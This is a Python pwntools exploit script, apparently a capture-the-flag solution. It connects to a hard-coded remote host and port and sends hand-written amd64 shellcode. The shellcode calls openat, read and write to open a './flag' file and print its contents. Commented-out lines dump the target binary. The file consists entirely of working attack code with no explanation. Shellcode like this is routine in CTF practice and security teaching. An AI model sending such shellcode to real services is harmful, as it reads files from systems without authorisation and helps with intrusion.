#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
#host = "10.211.55.23"
#port = 8888
host = "188.226.140.60"
port = 10001
context.arch = "amd64"

# You can dump elf from 0x400000
# openat read write :)

r = remote(host,port)
sc =asm("""
    jmp f
open:
    xor rdi,rdi
    xor rax,rax
    xor rsi,rsi
    mov rax,0x101
    mov rdi,-100
    pop rsi
    xor rdx,rdx
    syscall

read :
    mov rdi,rax
    xor rax,rax
    mov rsi,rsp
    mov rdx,0x40
    syscall
write :
    mov rdx,rax
    xor rdi,rdi
    mov rsi,rsp
    inc rdi
    xor rax,rax
    inc rax
    syscall

    mov rax,0x3c
    syscall

f :
    call open
    .ascii "./flag"
    .byte 0
""")

r.recvuntil(":")
r.sendline(sc)
#r.recv(0x1000)

#time.sleep(1)
#data = r.recv(0x1000)
#f = open("binary","w")
#f.write(data)
r.interactive()
